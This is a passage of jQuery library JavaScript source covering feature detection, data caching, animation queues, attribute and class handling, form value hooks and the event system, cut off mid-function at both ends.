                            t[e] = this, n[e] = arguments.length > 1 ? l.call(arguments) : r, n === u ? s.notifyWith(t, n) : --i || s.resolveWith(t, n)
                        }
                    }, u, a, f;
                if (r > 1) {
                    u = new Array(r), a = new Array(r), f = new Array(r);
                    for (; t < r; t++) n[t] && v.isFunction(n[t].promise) ? n[t].promise().done(o(t, f, n)).fail(s.reject).progress(o(t, a, u)) : --i
                }
                return i || s.resolveWith(f, n), s.promise()
            }
        }), v.support = function () {
            var t, n, r, s, o, u, a, f, l, c, h, p = i.createElement("div");
            p.setAttribute("className", "t"), p.innerHTML = "  <link/><table></table><a href='/a'>a</a><input type='checkbox'/>", n = p.getElementsByTagName("*"), r = p.getElementsByTagName("a")[0], r.style.cssText = "top:1px;float:left;opacity:.5";
            if (!n || !n.length) return {};
            s = i.createElement("select"), o = s.appendChild(i.createElement("option")), u = p.getElementsByTagName("input")[0], t = {
                leadingWhitespace: p.firstChild.nodeType === 3,
                tbody: !p.getElementsByTagName("tbody").length,
                htmlSerialize: !! p.getElementsByTagName("link").length,
                style: /top/.test(r.getAttribute("style")),
                hrefNormalized: r.getAttribute("href") === "/a",
                opacity: /^0.5/.test(r.style.opacity),
                cssFloat: !! r.style.cssFloat,
                checkOn: u.value === "on",
                optSelected: o.selected,
                getSetAttribute: p.className !== "t",
                enctype: !! i.createElement("form").enctype,
                html5Clone: i.createElement("nav").cloneNode(!0).outerHTML !== "<:nav></:nav>",
                boxModel: i.compatMode === "CSS1Compat",
                submitBubbles: !0,
                changeBubbles: !0,
                focusinBubbles: !1,
                deleteExpando: !0,
                noCloneEvent: !0,
                inlineBlockNeedsLayout: !1,
                shrinkWrapBlocks: !1,
                reliableMarginRight: !0,
                boxSizingReliable: !0,
                pixelPosition: !1
            }, u.checked = !0, t.noCloneChecked = u.cloneNode(!0).checked, s.disabled = !0, t.optDisabled = !o.disabled;
            try {
                delete p.test
            } catch (d) {
                t.deleteExpando = !1
            }!p.addEventListener && p.attachEvent && p.fireEvent && (p.attachEvent("onclick", h = function () {
                t.noCloneEvent = !1
            }), p.cloneNode(!0).fireEvent("onclick"), p.detachEvent("onclick", h)), u = i.createElement("input"), u.value = "t", u.setAttribute("type", "radio"), t.radioValue = u.value === "t", u.setAttribute("checked", "checked"), u.setAttribute("name", "t"), p.appendChild(u), a = i.createDocumentFragment(), a.appendChild(p.lastChild), t.checkClone = a.cloneNode(!0).cloneNode(!0).lastChild.checked, t.appendChecked = u.checked, a.removeChild(u), a.appendChild(p);
            if (p.attachEvent)
                for (l in {
                    submit: !0,
                    change: !0,
                    focusin: !0
                }) f = "on" + l, c = f in p, c || (p.setAttribute(f, "return;"), c = typeof p[f] == "function"), t[l + "Bubbles"] = c;
            return v(function () {
                var n, r, s, o, u = "padding:0;margin:0;border:0;display:block;overflow:hidden;",
                    a = i.getElementsByTagName("body")[0];
                if (!a) return;
                n = i.createElement("div"), n.style.cssText = "visibility:hidden;border:0;width:0;height:0;position:static;top:0;margin-top:1px", a.insertBefore(n, a.firstChild), r = i.createElement("div"), n.appendChild(r), r.innerHTML = "<table><tr><td></td><td>t</td></tr></table>", s = r.getElementsByTagName("td"), s[0].style.cssText = "padding:0;margin:0;border:0;display:none", c = s[0].offsetHeight === 0, s[0].style.display = "", s[1].style.display = "none", t.reliableHiddenOffsets = c && s[0].offsetHeight === 0, r.innerHTML = "", r.style.cssText = "box-sizing:border-box;-moz-box-sizing:border-box;-webkit-box-sizing:border-box;padding:1px;border:1px;display:block;width:4px;margin-top:1%;position:absolute;top:1%;", t.boxSizing = r.offsetWidth === 4, t.doesNotIncludeMarginInBodyOffset = a.offsetTop !== 1, e.getComputedStyle && (t.pixelPosition = (e.getComputedStyle(r, null) || {}).top !== "1%", t.boxSizingReliable = (e.getComputedStyle(r, null) || {
                    width: "4px"
                }).width === "4px", o = i.createElement("div"), o.style.cssText = r.style.cssText = u, o.style.marginRight = o.style.width = "0", r.style.width = "1px", r.appendChild(o), t.reliableMarginRight = !parseFloat((e.getComputedStyle(o, null) || {}).marginRight)), typeof r.style.zoom != "undefined" && (r.innerHTML = "", r.style.cssText = u + "width:1px;padding:1px;display:inline;zoom:1", t.inlineBlockNeedsLayout = r.offsetWidth === 3, r.style.display = "block", r.style.overflow = "visible", r.innerHTML = "<div></div>", r.firstChild.style.width = "5px", t.shrinkWrapBlocks = r.offsetWidth !== 3, n.style.zoom = 1), a.removeChild(n), n = r = s = o = null
            }), a.removeChild(p), n = r = s = o = u = a = p = null, t
        }();
        var D = /(?:\{[\s\S]*\}|\[[\s\S]*\])$/,
            P = /([A-Z])/g;
        v.extend({
            cache: {},
            deletedIds: [],
            uuid: 0,
            expando: "jQuery" + (v.fn.jquery + Math.random()).replace(/\D/g, ""),
            noData: {
                embed: !0,
                object: "clsid:D27CDB6E-AE6D-11cf-96B8-444553540000",
                applet: !0
            },
            hasData: function (e) {
                return e = e.nodeType ? v.cache[e[v.expando]] : e[v.expando], !! e && !B(e)
            },
            data: function (e, n, r, i) {
                if (!v.acceptData(e)) return;
                var s, o, u = v.expando,
                    a = typeof n == "string",
                    f = e.nodeType,
                    l = f ? v.cache : e,
                    c = f ? e[u] : e[u] && u;
                if ((!c || !l[c] || !i && !l[c].data) && a && r === t) return;
                c || (f ? e[u] = c = v.deletedIds.pop() || v.guid++ : c = u), l[c] || (l[c] = {}, f || (l[c].toJSON = v.noop));
                if (typeof n == "object" || typeof n == "function") i ? l[c] = v.extend(l[c], n) : l[c].data = v.extend(l[c].data, n);
                return s = l[c], i || (s.data || (s.data = {}), s = s.data), r !== t && (s[v.camelCase(n)] = r), a ? (o = s[n], o == null && (o = s[v.camelCase(n)])) : o = s, o
            },
            removeData: function (e, t, n) {
                if (!v.acceptData(e)) return;
                var r, i, s, o = e.nodeType,
                    u = o ? v.cache : e,
                    a = o ? e[v.expando] : v.expando;
                if (!u[a]) return;
                if (t) {
                    r = n ? u[a] : u[a].data;
                    if (r) {
                        v.isArray(t) || (t in r ? t = [t] : (t = v.camelCase(t), t in r ? t = [t] : t = t.split(" ")));
                        for (i = 0, s = t.length; i < s; i++) delete r[t[i]];
                        if (!(n ? B : v.isEmptyObject)(r)) return
                    }
                }
                if (!n) {
                    delete u[a].data;
                    if (!B(u[a])) return
                }
                o ? v.cleanData([e], !0) : v.support.deleteExpando || u != u.window ? delete u[a] : u[a] = null
            },
            _data: function (e, t, n) {
                return v.data(e, t, n, !0)
            },
            acceptData: function (e) {
                var t = e.nodeName && v.noData[e.nodeName.toLowerCase()];
                return !t || t !== !0 && e.getAttribute("classid") === t
            }
        }), v.fn.extend({
            data: function (e, n) {
                var r, i, s, o, u, a = this[0],
                    f = 0,
                    l = null;
                if (e === t) {
                    if (this.length) {
                        l = v.data(a);
                        if (a.nodeType === 1 && !v._data(a, "parsedAttrs")) {
                            s = a.attributes;
                            for (u = s.length; f < u; f++) o = s[f].name, o.indexOf("data-") || (o = v.camelCase(o.substring(5)), H(a, o, l[o]));
                            v._data(a, "parsedAttrs", !0)
                        }
                    }
                    return l
                }
                return typeof e == "object" ? this.each(function () {
                    v.data(this, e)
                }) : (r = e.split(".", 2), r[1] = r[1] ? "." + r[1] : "", i = r[1] + "!", v.access(this, function (n) {
                    if (n === t) return l = this.triggerHandler("getData" + i, [r[0]]), l === t && a && (l = v.data(a, e), l = H(a, e, l)), l === t && r[1] ? this.data(r[0]) : l;
                    r[1] = n, this.each(function () {
                        var t = v(this);
                        t.triggerHandler("setData" + i, r), v.data(this, e, n), t.triggerHandler("changeData" + i, r)
                    })
                }, null, n, arguments.length > 1, null, !1))
            },
            removeData: function (e) {
                return this.each(function () {
                    v.removeData(this, e)
                })
            }
        }), v.extend({
            queue: function (e, t, n) {
                var r;
                if (e) return t = (t || "fx") + "queue", r = v._data(e, t), n && (!r || v.isArray(n) ? r = v._data(e, t, v.makeArray(n)) : r.push(n)), r || []
            },
            dequeue: function (e, t) {
                t = t || "fx";
                var n = v.queue(e, t),
                    r = n.length,
                    i = n.shift(),
                    s = v._queueHooks(e, t),
                    o = function () {
                        v.dequeue(e, t)
                    };
                i === "inprogress" && (i = n.shift(), r--), i && (t === "fx" && n.unshift("inprogress"), delete s.stop, i.call(e, o, s)), !r && s && s.empty.fire()
            },
            _queueHooks: function (e, t) {
                var n = t + "queueHooks";
                return v._data(e, n) || v._data(e, n, {
                    empty: v.Callbacks("once memory").add(function () {
                        v.removeData(e, t + "queue", !0), v.removeData(e, n, !0)
                    })
                })
            }
        }), v.fn.extend({
            queue: function (e, n) {
                var r = 2;
                return typeof e != "string" && (n = e, e = "fx", r--), arguments.length < r ? v.queue(this[0], e) : n === t ? this : this.each(function () {
                    var t = v.queue(this, e, n);
                    v._queueHooks(this, e), e === "fx" && t[0] !== "inprogress" && v.dequeue(this, e)
                })
            },
            dequeue: function (e) {
                return this.each(function () {
                    v.dequeue(this, e)
                })
            },
            delay: function (e, t) {
                return e = v.fx ? v.fx.speeds[e] || e : e, t = t || "fx", this.queue(t, function (t, n) {
                    var r = setTimeout(t, e);
                    n.stop = function () {
                        clearTimeout(r)
                    }
                })
            },
            clearQueue: function (e) {
                return this.queue(e || "fx", [])
            },
            promise: function (e, n) {
                var r, i = 1,
                    s = v.Deferred(),
                    o = this,
                    u = this.length,
                    a = function () {
                        --i || s.resolveWith(o, [o])
                    };
                typeof e != "string" && (n = e, e = t), e = e || "fx";
                while (u--) r = v._data(o[u], e + "queueHooks"), r && r.empty && (i++, r.empty.add(a));
                return a(), s.promise(n)
            }
        });
        var j, F, I, q = /[\t\r\n]/g,
            R = /\r/g,
            U = /^(?:button|input)$/i,
            z = /^(?:button|input|object|select|textarea)$/i,
            W = /^a(?:rea|)$/i,
            X = /^(?:autofocus|autoplay|async|checked|controls|defer|disabled|hidden|loop|multiple|open|readonly|required|scoped|selected)$/i,
            V = v.support.getSetAttribute;
        v.fn.extend({
            attr: function (e, t) {
                return v.access(this, v.attr, e, t, arguments.length > 1)
            },
            removeAttr: function (e) {
                return this.each(function () {
                    v.removeAttr(this, e)
                })
            },
            prop: function (e, t) {
                return v.access(this, v.prop, e, t, arguments.length > 1)
            },
            removeProp: function (e) {
                return e = v.propFix[e] || e, this.each(function () {
                    try {
                        this[e] = t, delete this[e]
                    } catch (n) {}
                })
            },
            addClass: function (e) {
                var t, n, r, i, s, o, u;
                if (v.isFunction(e)) return this.each(function (t) {
                    v(this).addClass(e.call(this, t, this.className))
                });
                if (e && typeof e == "string") {
                    t = e.split(y);
                    for (n = 0, r = this.length; n < r; n++) {
                        i = this[n];
                        if (i.nodeType === 1)
                            if (!i.className && t.length === 1) i.className = e;
                            else {
                                s = " " + i.className + " ";
                                for (o = 0, u = t.length; o < u; o++) s.indexOf(" " + t[o] + " ") < 0 && (s += t[o] + " ");
                                i.className = v.trim(s)
                            }
                    }
                }
                return this
            },
            removeClass: function (e) {
                var n, r, i, s, o, u, a;
                if (v.isFunction(e)) return this.each(function (t) {
                    v(this).removeClass(e.call(this, t, this.className))
                });
                if (e && typeof e == "string" || e === t) {
                    n = (e || "").split(y);
                    for (u = 0, a = this.length; u < a; u++) {
                        i = this[u];
                        if (i.nodeType === 1 && i.className) {
                            r = (" " + i.className + " ").replace(q, " ");
                            for (s = 0, o = n.length; s < o; s++)
                                while (r.indexOf(" " + n[s] + " ") >= 0) r = r.replace(" " + n[s] + " ", " ");
                            i.className = e ? v.trim(r) : ""
                        }
                    }
                }
                return this
            },
            toggleClass: function (e, t) {
                var n = typeof e,
                    r = typeof t == "boolean";
                return v.isFunction(e) ? this.each(function (n) {
                    v(this).toggleClass(e.call(this, n, this.className, t), t)
                }) : this.each(function () {
                    if (n === "string") {
                        var i, s = 0,
                            o = v(this),
                            u = t,
                            a = e.split(y);
                        while (i = a[s++]) u = r ? u : !o.hasClass(i), o[u ? "addClass" : "removeClass"](i)
                    } else if (n === "undefined" || n === "boolean") this.className && v._data(this, "__className__", this.className), this.className = this.className || e === !1 ? "" : v._data(this, "__className__") || ""
                })
            },
            hasClass: function (e) {
                var t = " " + e + " ",
                    n = 0,
                    r = this.length;
                for (; n < r; n++)
                    if (this[n].nodeType === 1 && (" " + this[n].className + " ").replace(q, " ").indexOf(t) >= 0) return !0;
                return !1
            },
            val: function (e) {
                var n, r, i, s = this[0];
                if (!arguments.length) {
                    if (s) return n = v.valHooks[s.type] || v.valHooks[s.nodeName.toLowerCase()], n && "get" in n && (r = n.get(s, "value")) !== t ? r : (r = s.value, typeof r == "string" ? r.replace(R, "") : r == null ? "" : r);
                    return
                }
                return i = v.isFunction(e), this.each(function (r) {
                    var s, o = v(this);
                    if (this.nodeType !== 1) return;
                    i ? s = e.call(this, r, o.val()) : s = e, s == null ? s = "" : typeof s == "number" ? s += "" : v.isArray(s) && (s = v.map(s, function (e) {
                        return e == null ? "" : e + ""
                    })), n = v.valHooks[this.type] || v.valHooks[this.nodeName.toLowerCase()];
                    if (!n || !("set" in n) || n.set(this, s, "value") === t) this.value = s
                })
            }
        }), v.extend({
            valHooks: {
                option: {
                    get: function (e) {
                        var t = e.attributes.value;
                        return !t || t.specified ? e.value : e.text
                    }
                },
                select: {
                    get: function (e) {
                        var t, n, r, i, s = e.selectedIndex,
                            o = [],
                            u = e.options,
                            a = e.type === "select-one";
                        if (s < 0) return null;
                        n = a ? s : 0, r = a ? s + 1 : u.length;
                        for (; n < r; n++) {
                            i = u[n];
                            if (i.selected && (v.support.optDisabled ? !i.disabled : i.getAttribute("disabled") === null) && (!i.parentNode.disabled || !v.nodeName(i.parentNode, "optgroup"))) {
                                t = v(i).val();
                                if (a) return t;
                                o.push(t)
                            }
                        }
                        return a && !o.length && u.length ? v(u[s]).val() : o
                    },
                    set: function (e, t) {
                        var n = v.makeArray(t);
                        return v(e).find("option").each(function () {
                            this.selected = v.inArray(v(this).val(), n) >= 0
                        }), n.length || (e.selectedIndex = -1), n
                    }
                }
            },
            attrFn: {},
            attr: function (e, n, r, i) {
                var s, o, u, a = e.nodeType;
                if (!e || a === 3 || a === 8 || a === 2) return;
                if (i && v.isFunction(v.fn[n])) return v(e)[n](r);
                if (typeof e.getAttribute == "undefined") return v.prop(e, n, r);
                u = a !== 1 || !v.isXMLDoc(e), u && (n = n.toLowerCase(), o = v.attrHooks[n] || (X.test(n) ? F : j));
                if (r !== t) {
                    if (r === null) {
                        v.removeAttr(e, n);
                        return
                    }
                    return o && "set" in o && u && (s = o.set(e, r, n)) !== t ? s : (e.setAttribute(n, r + ""), r)
                }
                return o && "get" in o && u && (s = o.get(e, n)) !== null ? s : (s = e.getAttribute(n), s === null ? t : s)
            },
            removeAttr: function (e, t) {
                var n, r, i, s, o = 0;
                if (t && e.nodeType === 1) {
                    r = t.split(y);
                    for (; o < r.length; o++) i = r[o], i && (n = v.propFix[i] || i, s = X.test(i), s || v.attr(e, i, ""), e.removeAttribute(V ? i : n), s && n in e && (e[n] = !1))
                }
            },
            attrHooks: {
                type: {
                    set: function (e, t) {
                        if (U.test(e.nodeName) && e.parentNode) v.error("type property can't be changed");
                        else if (!v.support.radioValue && t === "radio" && v.nodeName(e, "input")) {
                            var n = e.value;
                            return e.setAttribute("type", t), n && (e.value = n), t
                        }
                    }
                },
                value: {
                    get: function (e, t) {
                        return j && v.nodeName(e, "button") ? j.get(e, t) : t in e ? e.value : null
                    },
                    set: function (e, t, n) {
                        if (j && v.nodeName(e, "button")) return j.set(e, t, n);
                        e.value = t
                    }
                }
            },
            propFix: {
                tabindex: "tabIndex",
                readonly: "readOnly",
                "for": "htmlFor",
                "class": "className",
                maxlength: "maxLength",
                cellspacing: "cellSpacing",
                cellpadding: "cellPadding",
                rowspan: "rowSpan",
                colspan: "colSpan",
                usemap: "useMap",
                frameborder: "frameBorder",
                contenteditable: "contentEditable"
            },
            prop: function (e, n, r) {
                var i, s, o, u = e.nodeType;
                if (!e || u === 3 || u === 8 || u === 2) return;
                return o = u !== 1 || !v.isXMLDoc(e), o && (n = v.propFix[n] || n, s = v.propHooks[n]), r !== t ? s && "set" in s && (i = s.set(e, r, n)) !== t ? i : e[n] = r : s && "get" in s && (i = s.get(e, n)) !== null ? i : e[n]
            },
            propHooks: {
                tabIndex: {
                    get: function (e) {
                        var n = e.getAttributeNode("tabindex");
                        return n && n.specified ? parseInt(n.value, 10) : z.test(e.nodeName) || W.test(e.nodeName) && e.href ? 0 : t
                    }
                }
            }
        }), F = {
            get: function (e, n) {
                var r, i = v.prop(e, n);
                return i === !0 || typeof i != "boolean" && (r = e.getAttributeNode(n)) && r.nodeValue !== !1 ? n.toLowerCase() : t
            },
            set: function (e, t, n) {
                var r;
                return t === !1 ? v.removeAttr(e, n) : (r = v.propFix[n] || n, r in e && (e[r] = !0), e.setAttribute(n, n.toLowerCase())), n
            }
        }, V || (I = {
            name: !0,
            id: !0,
            coords: !0
        }, j = v.valHooks.button = {
            get: function (e, n) {
                var r;
                return r = e.getAttributeNode(n), r && (I[n] ? r.value !== "" : r.specified) ? r.value : t
            },
            set: function (e, t, n) {
                var r = e.getAttributeNode(n);
                return r || (r = i.createAttribute(n), e.setAttributeNode(r)), r.value = t + ""
            }
        }, v.each(["width", "height"], function (e, t) {
            v.attrHooks[t] = v.extend(v.attrHooks[t], {
                set: function (e, n) {
                    if (n === "") return e.setAttribute(t, "auto"), n
                }
            })
        }), v.attrHooks.contenteditable = {
            get: j.get,
            set: function (e, t, n) {
                t === "" && (t = "false"), j.set(e, t, n)
            }
        }), v.support.hrefNormalized || v.each(["href", "src", "width", "height"], function (e, n) {
            v.attrHooks[n] = v.extend(v.attrHooks[n], {
                get: function (e) {
                    var r = e.getAttribute(n, 2);
                    return r === null ? t : r
                }
            })
        }), v.support.style || (v.attrHooks.style = {
            get: function (e) {
                return e.style.cssText.toLowerCase() || t
            },
            set: function (e, t) {
                return e.style.cssText = t + ""
            }
        }), v.support.optSelected || (v.propHooks.selected = v.extend(v.propHooks.selected, {
            get: function (e) {
                var t = e.parentNode;
                return t && (t.selectedIndex, t.parentNode && t.parentNode.selectedIndex), null
            }
        })), v.support.enctype || (v.propFix.enctype = "encoding"), v.support.checkOn || v.each(["radio", "checkbox"], function () {
            v.valHooks[this] = {
                get: function (e) {
                    return e.getAttribute("value") === null ? "on" : e.value
                }
            }
        }), v.each(["radio", "checkbox"], function () {
            v.valHooks[this] = v.extend(v.valHooks[this], {
                set: function (e, t) {
                    if (v.isArray(t)) return e.checked = v.inArray(v(e).val(), t) >= 0
                }
            })
        });
        var $ = /^(?:textarea|input|select)$/i,
            J = /^([^\.]*|)(?:\.(.+)|)$/,
            K = /(?:^|\s)hover(\.\S+|)\b/,
            Q = /^key/,
            G = /^(?:mouse|contextmenu)|click/,
            Y = /^(?:focusinfocus|focusoutblur)$/,
            Z = function (e) {
                return v.event.special.hover ? e : e.replace(K, "mouseenter$1 mouseleave$1")
            };
        v.event = {
            add: function (e, n, r, i, s) {
                var o, u, a, f, l, c, h, p, d, m, g;
                if (e.nodeType === 3 || e.nodeType === 8 || !n || !r || !(o = v._data(e))) return;
                r.handler && (d = r, r = d.handler, s = d.selector), r.guid || (r.guid = v.guid++), a = o.events, a || (o.events = a = {}), u = o.handle, u || (o.handle = u = function (e) {
                    return typeof v == "undefined" || !! e && v.event.triggered === e.type ? t : v.event.dispatch.apply(u.elem, arguments)
                }, u.elem = e), n = v.trim(Z(n)).split(" ");
                for (f = 0; f < n.length; f++) {
                    l = J.exec(n[f]) || [], c = l[1], h = (l[2] || "").split(".").sort(), g = v.event.special[c] || {}, c = (s ? g.delegateType : g.bindType) || c, g = v.event.special[c] || {}, p = v.extend({
                        type: c,
                        origType: l[1],
                        data: i,
                        handler: r,
                        guid: r.guid,
                        selector: s,
                        needsContext: s && v.expr.match.needsContext.test(s),
                        namespace: h.join(".")
                    }, d), m = a[c];
                    if (!m) {
                        m = a[c] = [], m.delegateCount = 0;
                        if (!g.setup || g.setup.call(e, i, h, u) === !1) e.addEventListener ? e.addEventListener(c, u, !1) : e.attachEvent && e.attachEvent("on" + c, u)
                    }
                    g.add && (g.add.call(e, p), p.handler.guid || (p.handler.guid = r.guid)), s ? m.splice(m.delegateCount++, 0, p) : m.push(p), v.event.global[c] = !0
                }
                e = null
            },
            global: {},
            remove: function (e, t, n, r, i) {
                var s, o, u, a, f, l, c, h, p, d, m, g = v.hasData(e) && v._data(e);
                if (!g || !(h = g.events)) return;
                t = v.trim(Z(t || "")).split(" ");
                for (s = 0; s < t.length; s++) {
                    o = J.exec(t[s]) || [], u = a = o[1], f = o[2];
                    if (!u) {
                        for (u in h) v.event.remove(e, u + t[s], n, r, !0);
                        continue
                    }
                    p = v.event.special[u] || {}, u = (r ? p.delegateType : p.bindType) || u, d = h[u] || [], l = d.length, f = f ? new RegExp("(^|\\.)" + f.split(".").sort().join("\\.(?:.*\\.|)") + "(\\.|$)") : null;
                    for (c = 0; c < d.length; c++) m = d[c], (i || a === m.origType) && (!n || n.guid === m.guid) && (!f || f.test(m.namespace)) && (!r || r === m.selector || r === "**" && m.selector) && (d.splice(c--, 1), m.selector && d.delegateCount--, p.remove && p.remove.call(e, m));
                    d.length === 0 && l !== d.length && ((!p.teardown || p.teardown.call(e, f, g.handle) === !1) && v.removeEvent(e, u, g.handle), delete h[u])
                }
                v.isEmptyObject(h) && (delete g.handle, v.removeData(e, "events", !0))
            },
            customEvent: {
                getData: !0,
                setData: !0,
                changeData: !0
            },
            trigger: function (n, r, s, o) {
                if (!s || s.nodeType !== 3 && s.nodeType !== 8) {
                    var u, a, f, l, c, h, p, d, m, g, y = n.type || n,
                        b = [];
                    if (Y.test(y + v.event.triggered)) return;
                    y.indexOf("!") >= 0 && (y = y.slice(0, -1), a = !0), y.indexOf(".") >= 0 && (b = y.split("."), y = b.shift(), b.sort());
                    if ((!s || v.event.customEvent[y]) && !v.event.global[y]) return;
                    n = typeof n == "object" ? n[v.expando] ? n : new v.Event(y, n) : new v.Event(y), n.type = y, n.isTrigger = !0, n.exclusive = a, n.namespace = b.join("."), n.namespace_re = n.namespace ? new RegExp("(^|\\.)" + b.join("\\.(?:.*\\.|)") + "(\\.|$)") : null, h = y.indexOf(":") < 0 ? "on" + y : "";
                    if (!s) {
                        u = v.cache;
                        for (f in u) u[f].events && u[f].events[y] && v.event.trigger(n, r, u[f].handle.elem, !0);
                        return
                    }
                    n.result = t, n.target || (n.target = s), r = r != null ? v.makeArray(r) : [], r.unshift(n), p = v.event.special[y] || {};
                    if (p.trigger && p.trigger.apply(s, r) === !1) return;
                    m = [
                        [s, p.bindType || y]
                    ];
                    if (!o && !p.noBubble && !v.isWindow(s)) {
                        g = p.delegateType || y, l = Y.test(g + y) ? s : s.parentNode;
                        for (c = s; l; l = l.parentNode) m.push([l, g]), c = l;
                        c === (s.ownerDocument || i) && m.push([c.defaultView || c.parentWindow || e, g])
                    }
                    for (f = 0; f < m.length && !n.isPropagationStopped(); f++) l = m[f][0], n.type = m[f][1], d = (v._data(l, "events") || {})[n.type] && v._data(l, "handle"), d && d.apply(l, r), d = h && l[h], d && v.acceptData(l) && d.apply && d.apply(l, r) === !1 && n.preventDefault();
                    return n.type = y, !o && !n.isDefaultPrevented() && (!p._default || p._default.apply(s.ownerDocument, r) === !1) && (y !== "click" || !v.nodeName(s, "a")) && v.acceptData(s) && h && s[y] && (y !== "focus" && y !== "blur" || n.target.offsetWidth !== 0) && !v.isWindow(s) && (c = s[h], c && (s[h] = null), v.event.triggered = y, s[y](), v.event.triggered = t, c && (s[h] = c)), n.result
                }
                return
            },
            dispatch: function (n) {
                n = v.event.fix(n || e.event);
                var r, i, s, o, u, a, f, c, h, p, d = (v._data(this, "events") || {})[n.type] || [],
                    m = d.delegateCount,
                    g = l.call(arguments),
                    y = !n.exclusive && !n.namespace,
                    b = v.event.special[n.type] || {}, w = [];
                g[0] = n, n.delegateTarget = this;
                if (b.preDispatch && b.preDispatch.call(this, n) === !1) return;
                if (m && (!n.button || n.type !== "click"))
                    for (s = n.target; s != this; s = s.parentNode || this)
                        if (s.disabled !== !0 || n.type !== "click") {
                            u = {}, f = [];
                            for (r = 0; r < m; r++) c = d[r], h = c.selector, u[h] === t && (u[h] = c.needsContext ? v(h, this).index(s) >= 0 : v.find(h, this, null, [s]).length), u[h] && f.push(c);
                            f.length && w.push({
                                elem: s,
                                matches: f
                            })
                        }
                d.length > m && w.push({
                    elem: this,
                    matches: d.slice(m)
                });
                for (r = 0; r < w.length && !n.isPropagationStopped(); r++) {
                    a = w[r], n.currentTarget = a.elem;
                    for (i = 0; i < a.matches.length && !n.isImmediatePropagationStopped(); i++) {
                        c = a.matches[i];
                        if (y || !n.namespace && !c.namespace || n.namespace_re && n.namespace_re.test(c.namespace)) n.data = c.data, n.handleObj = c, o = ((v.event.special[c.origType] || {}).handle || c.handler).apply(a.elem, g), o !== t && (n.result = o, o === !1 && (n.preventDefault(), n.stopPropagation()))
                    }
                }
                return b.postDispatch && b.postDispatch.call(this, n), n.result
            },
            props: "attrChange attrName relatedNode srcElement altKey bubbles cancelable ctrlKey currentTarget eventPhase metaKey relatedTarget shiftKey target timeStamp view which".split(" "),
            fixHooks: {},
            keyHooks: {
                props: "char charCode key keyCode".split(" "),
                filter: function (e, t) {
                    return e.which == null && (e.which = t.charCode != null ? t.charCode : t.keyCode), e
                }
            },
            mouseHooks: {
                props: "button buttons clientX clientY fromElement offsetX offsetY pageX pageY screenX screenY toElement".split(" "),
                filter: function (e, n) {
                    var r, s, o, u = n.button,
                        a = n.fromElement;
                    return e.pageX == null && n.clientX != null && (r = e.target.ownerDocument || i, s = r.documentElement, o = r.body, e.pageX = n.clientX + (s && s.scrollLeft || o && o.scrollLeft || 0) - (s && s.clientLeft || o && o.clientLeft || 0), e.pageY = n.clientY + (s && s.scrollTop || o && o.scrollTop || 0) - (s && s.clientTop || o && o.clientTop || 0)), !e.relatedTarget && a && (e.relatedTarget = a === e.target ? n.toElement : a), !e.which && u !== t && (e.which = u & 1 ? 1 : u & 2 ? 3 : u & 4 ? 2 : 0), e
                }
            },
            fix: function (e) {
                if (e[v.expando]) return e;
                var t, n, r = e,
                    s = v.event.fixHooks[e.type] || {}, o = s.props ? this.props.concat(s.props) : this.props;
                e = v.Event(r);
                for (t = o.length; t;) n = o[--t], e[n] = r[n];
                return e.target || (e.target = r.srcElement || i), e.target.nodeType === 3 && (e.target = e.target.parentNode), e.metaKey = !! e.metaKey, s.filter ? s.filter(e, r) : e
            },
            special: {
                load: {
                    noBubble: !0
                },
                focus: {
                    delegateType: "focusin"
                },
                blur: {
                    delegateType: "focusout"
                },
                beforeunload: {
                    setup: function (e, t, n) {
                        v.isWindow(this) && (this.onbeforeunload = n)
                    },
                    teardown: function (e, t) {
                        this.onbeforeunload === t && (this.onbeforeunload = null)
                    }
                }
            },
            simulate: function (e, t, n, r) {
                var i = v.extend(new v.Event, n, {
                    type: e,
                    isSimulated: !0,
                    originalEvent: {}
                });
                r ? v.event.trigger(i, null, t) : v.event.dispatch.call(t, i), i.isDefaultPrevented() && n.preventDefault()
            }
        }, v.event.handle = v.event.dispatch, v.removeEvent = i.removeEventListener ? function (e, t, n) {
            e.removeEventListener && e.removeEventListener(t, n, !1)
        } : function (e, t, n) {
            var r = "on" + t;
            e.detachEvent && (typeof e[r] == "undefined" && (e[r] = null), e.detachEvent(r, n))
        }, v.Event = function (e, t) {
            if (!(this instanceof v.Event)) return new v.Event(e, t);
            e && e.type ? (this.originalEvent = e, this.type = e.type, this.isDefaultPrevented = e.defaultPrevented || e.returnValue === !1 || e.getPreventDefault && e.getPreventDefault() ? tt : et) : this.type = e, t && v.extend(this, t), this.timeStamp = e && e.timeStamp || v.now(), this[v.expando] = !0
        }, v.Event.prototype = {
            preventDefault: function () {
                this.isDefaultPrevented = tt;
                var e = this.originalEvent;
                if (!e) return;
                e.preventDefault ? e.preventDefault() : e.returnValue = !1
            },
            stopPropagation: function () {
                this.isPropagationStopped = tt;
                var e = this.originalEvent;
                if (!e) return;
                e.stopPropagation && e.stopPropagation(), e.cancelBubble = !0
            },
            stopImmediatePropagation: function () {
                this.isImmediatePropagationStopped = tt, this.stopPropagation()
            },
            isDefaultPrevented: et,
            isPropagationStopped: et,
            isImmediatePropagationStopped: et
        }, v.each({
            mouseenter: "mouseover",
            mouseleave: "mouseout"
        }, function (e, t) {
            v.event.special[e] = {
                delegateType: t,
                bindType: t,
                handle: function (e) {
                    var n, r = this,
                        i = e.relatedTarget,
                        s = e.handleObj,
                        o = s.selector;
                    if (!i || i !== r && !v.contains(r, i)) e.type = s.origType, n = s.handler.apply(this, arguments), e.type = t;
                    return n
                }
            }
        }), v.support.submitBubbles || (v.event.special.submit = {
            setup: function () {
                if (v.nodeName(this, "form")) return !1;
                v.event.add(this, "click._submit keypress._submit", function (e) {
                    var n = e.target,
                        r = v.nodeName(n, "input") || v.nodeName(n, "button") ? n.form : t;
                    r && !v._data(r, "_submit_attached") && (v.event.add(r, "submit._submit", function (e) {
                        e._submit_bubble = !0
                    }), v._data(r, "_submit_attached", !0))
                })
            },
            postDispatch: function (e) {
                e._submit_bubble && (delete e._submit_bubble, this.parentNode && !e.isTrigger && v.event.simulate("submit", this.parentNode, e, !0))
            },
            teardown: function () {
                if (v.nodeName(this, "form")) return !1;
                v.event.remove(this, "._submit")
            }
        }), v.support.changeBubbles || (v.event.special.change = {
            setup: function () {
                if ($.test(this.nodeName)) {
                    if (this.type === "checkbox" || this.type === "radio") v.event.add(this, "propertychange._change", function (e) {
                        e.originalEvent.propertyName === "checked" && (this._just_changed = !0)
                    }), v.event.add(this, "click._change", function (e) {
                        this._just_changed && !e.isTrigger && (this._just_changed = !1), v.event.simulate("change", this, e, !0)
                    });
                    return !1
                }
                v.event.add(this, "beforeactivate._change", function (e) {
                    var t = e.target;
